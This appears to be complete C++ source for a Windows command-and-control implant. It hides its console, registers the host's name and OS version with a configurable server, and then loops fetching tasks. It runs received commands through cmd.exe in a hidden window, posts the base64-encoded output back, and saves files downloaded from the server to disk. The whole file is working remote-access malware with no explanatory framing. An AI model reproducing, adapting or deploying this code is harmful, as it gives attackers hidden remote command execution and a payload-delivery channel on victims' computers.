#ifndef SERVER_IP
#define SERVER_IP "127.0.0.1"
#endif

#ifndef SERVER_PORT
#define SERVER_PORT 8080
#endif

#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>

#include <string>
#include <regex>
#include <sstream>
#include <iomanip>
#include <cctype>
#include <fstream>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

std::string base64_encode(const std::string &input)
{
    if (input.empty())
        return "";

    DWORD encodedLen = 0;
    if (!CryptBinaryToStringA(reinterpret_cast<const BYTE *>(input.data()), input.size(),
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedLen))
        return "";

    std::string output(encodedLen, '\0');
    if (!CryptBinaryToStringA(reinterpret_cast<const BYTE *>(input.data()), input.size(),
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &output[0], &encodedLen))
        return "";

    if (!output.empty() && output.back() == '\0')
        output.pop_back();

    return output;
}

bool save_file(const std::string &filename, const std::string &data)
{
    std::ofstream ofs(filename, std::ios::binary);
    if (!ofs.is_open())
        return false;
    ofs.write(data.data(), data.size());
    return true;
}

unsigned int extract_id(const std::string &s)
{
    std::regex r("\"id\"\\s*:\\s*(\\d+)");
    std::smatch m;
    if (std::regex_search(s, m, r))
        return std::stoi(m[1]);
    return 0;
}

std::string extract_command(const std::string &s)
{
    std::regex r("\"command\"\\s*:\\s*\"([^\"]+)\"");
    std::smatch m;
    if (std::regex_search(s, m, r))
        return m[1];
    return "";
}

std::string extract_name(const std::string &s)
{
    std::regex r("\"name\"\\s*:\\s*\"([^\"]*)\"");
    std::smatch m;
    if (std::regex_search(s, m, r))
        return m[1].str();
    return "";
}

std::wstring str_to_wstr(const std::string &s)
{
    return std::wstring(s.begin(), s.end());
}

std::string ansi_to_utf8(const std::string &ansi_str)
{
    if (ansi_str.empty())
        return std::string();

    int wlen = MultiByteToWideChar(CP_OEMCP, 0, ansi_str.c_str(), -1, NULL, 0);
    if (wlen == 0)
        return std::string();

    std::wstring wstr(wlen, 0);
    MultiByteToWideChar(CP_OEMCP, 0, ansi_str.c_str(), -1, &wstr[0], wlen);

    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (len == 0)
        return std::string();

    std::string utf8str(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &utf8str[0], len, NULL, NULL);

    if (!utf8str.empty() && utf8str.back() == '\0')
        utf8str.pop_back();

    return utf8str;
}

std::string trim(const std::string &s)
{
    size_t start = s.find_first_not_of(" \r\n\t");
    size_t end = s.find_last_not_of(" \r\n\t");
    return (start == std::string::npos || end == std::string::npos) ? "" : s.substr(start, end - start + 1);
}

std::string get(const std::string &ip, unsigned int port, const std::string &route)
{
    std::wstring w_ip = str_to_wstr(ip);
    std::wstring w_route = str_to_wstr(route);

    HINTERNET hSession = WinHttpOpen(L"executor/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
        return "";

    HINTERNET hConnect = WinHttpConnect(hSession, w_ip.c_str(), port, 0);
    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return "";
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", w_route.c_str(), NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest)
    {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    BOOL result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                     WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!result || !WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    std::string response;
    DWORD bytesAvailable = 0;
    do
    {
        if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable) || bytesAvailable == 0)
            break;
        std::string buffer(bytesAvailable, 0);
        DWORD bytesRead = 0;
        if (!WinHttpReadData(hRequest, &buffer[0], bytesAvailable, &bytesRead))
            break;
        buffer.resize(bytesRead);
        response += buffer;
    } while (bytesAvailable > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return response;
}

std::string post(const std::string &ip, unsigned int port, const std::string &route, const std::string &json_payload)
{
    std::wstring w_ip = str_to_wstr(ip);
    std::wstring w_route = str_to_wstr(route);

    HINTERNET hSession = WinHttpOpen(L"executor/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
        return "";

    HINTERNET hConnect = WinHttpConnect(hSession, w_ip.c_str(), port, 0);
    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return "";
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", w_route.c_str(), NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest)
    {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    LPCWSTR headers = L"Content-Type: application/json\r\n";
    DWORD headersLength = -1;

    BOOL result = WinHttpSendRequest(hRequest,
                                     headers, headersLength,
                                     (LPVOID)json_payload.c_str(), (DWORD)json_payload.length(),
                                     (DWORD)json_payload.length(), 0);

    if (!result || !WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    std::string response;
    DWORD bytesAvailable = 0;
    do
    {
        if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable) || bytesAvailable == 0)
            break;
        std::string buffer(bytesAvailable, 0);
        DWORD bytesRead = 0;
        if (!WinHttpReadData(hRequest, &buffer[0], bytesAvailable, &bytesRead))
            break;
        buffer.resize(bytesRead);
        response += buffer;
    } while (bytesAvailable > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return response;
}

std::string spawn_command(const wchar_t *cmd)
{
    std::string result;
    HANDLE hPipeRead, hPipeWrite;

    SECURITY_ATTRIBUTES saAttr = {};
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
        return result;

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};
    std::wstring cmdCopy = cmd;

    BOOL success = CreateProcessW(NULL, &cmdCopy[0], NULL, NULL, TRUE,
                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(hPipeWrite);
    if (!success)
    {
        CloseHandle(hPipeRead);
        return result;
    }

    char buffer[1024];
    DWORD bytesRead = 0;
    while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead)
    {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    CloseHandle(hPipeRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return result;
}

std::string json_escape(const std::string &input)
{
    std::ostringstream ss;
    for (char c : input)
    {
        switch (c)
        {
        case '\"':
            ss << "\\\"";
            break;
        case '\\':
            ss << "\\\\";
            break;
        case '\b':
            ss << "\\b";
            break;
        case '\f':
            ss << "\\f";
            break;
        case '\n':
            ss << "\\n";
            break;
        case '\r':
            ss << "\\r";
            break;
        case '\t':
            ss << "\\t";
            break;
        default:
            if (static_cast<unsigned char>(c) < 0x20)
                ss << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else
                ss << c;
        }
    }
    return ss.str();
}

int main(int argc, char const *argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::string ip = SERVER_IP;
    unsigned int port = SERVER_PORT;
    if (argc >= 2)
        ip = argv[1];
    if (argc >= 3)
        port = std::stoi(argv[2]);

    int sleep_time = 3000;
    std::string hostname_ansi = trim(spawn_command(L"cmd.exe /c hostname"));
    std::string os_ansi = trim(spawn_command(L"cmd.exe /c ver"));

    std::string hostname = ansi_to_utf8(hostname_ansi);
    std::string os = ansi_to_utf8(os_ansi);

    std::string json_payload = "{\"hostname\":\"" + json_escape(hostname) + "\",\"os\":\"" + json_escape(os) + "\"}";
    std::string response = post(ip, port, "/reg", json_payload);
    std::string name = extract_name(response);

    while (true)
    {
        std::string task = get(ip, port, "/tasks/" + name);

        if (!task.empty())
        {
            unsigned int task_id = extract_id(task);
            std::string command = extract_command(task);

            if (!command.empty())
            {
                std::string output;

                if (command == "quit")
                {
                    output = "Agent exiting.";
                    std::string encoded_output = base64_encode(output);

                    std::string json_payload = "{\"task_id\":" + std::to_string(task_id) +
                                               ",\"agent_name\":\"" + json_escape(name) +
                                               "\",\"output\":\"" + encoded_output + "\"}";

                    post(ip, port, "/results/" + name, json_payload);
                    ExitProcess(0);
                }
                else if (command.rfind("exec ", 0) == 0)
                {
                    std::string to_exec = command.substr(5);
                    std::wstring exec = L"cmd.exe /c \"" + str_to_wstr(to_exec) + L"\"";
                    output = spawn_command(exec.c_str());
                }
                else if (command.rfind("download ", 0) == 0)
                {
                    std::string filename = command.substr(9);
                    std::string file_content = get(ip, port, "/download/" + filename);
                    if (file_content.empty())
                        output = "Error: File not found or empty.";
                    else
                        output = save_file(filename, file_content) ? ("File saved: " + filename) : "Error saving file.";
                }

                if (!output.empty())
                {
                    std::string encoded_output = base64_encode(output);

                    std::string json_payload = "{\"task_id\":" + std::to_string(task_id) +
                                               ",\"agent_name\":\"" + json_escape(name) +
                                               "\",\"output\":\"" + encoded_output + "\"}";

                    std::string server_response = post(ip, port, "/results/" + name, json_payload);
                }
            }
        }

        Sleep(sleep_time);
    }
}
